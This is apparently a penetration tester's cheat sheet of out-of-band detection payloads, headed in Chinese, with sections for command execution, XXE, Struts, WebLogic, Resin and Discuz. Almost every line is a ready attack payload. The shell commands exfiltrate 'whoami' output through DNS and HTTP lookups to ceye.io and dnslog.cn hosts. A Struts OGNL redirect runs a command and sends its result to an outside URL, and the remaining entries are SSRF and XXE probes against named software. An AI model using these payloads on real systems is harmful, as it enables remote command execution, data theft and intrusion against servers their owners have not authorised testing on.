    #### 命令执行
	>curl http://0ox095.ceye.io/`whoami`
	>ping `whoami`.b182oj.ceye.io
	>ping %CD%.lfofz7.dnslog.cn 
	&
	cmd /v /c "whoami > temp && certutil -encode temp temp2 && findstr /L /V "CERTIFICATE" temp2 > temp3 && set /p MYVAR=< temp3 && set FINAL=!MYVAR!.xxx.ceye.io && nslookup !FINAL!"
  #### XXE
	<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE root [
	<!ENTITY % remote SYSTEM "http://b182oj.ceye.io/xxe_test">
	%remote;]>
	<root/>
  #### Struts
	xx.action?redirect:http://b182oj.ceye.io/%25{3*4}
	xx.action?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'whoami'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23t%3d%23d.readLine(),%23u%3d"http://b182oj.ceye.io/result%3d".concat(%23t),%23http%3dnew%20java.net.URL(%23u).openConnection(),%23http.setRequestMethod("GET"),%23http.connect(),%23http.getInputStream()}
  #### weblogic
	/uddiexplorer/SearchPublicRegistries.jsp?operator=http://b182oj.ceye.io/test&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Businesslocation&btnSubmit=Search
  #### Resin
	xxoo.com/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=http://b182oj.ceye.io/ssrf
  #### Discuz
	/forum.php?mod=ajax&action=downremoteimg&message=[img=1,1]http://b182oj.ceye.io/xx.jpg[/img]&formhash=xxoo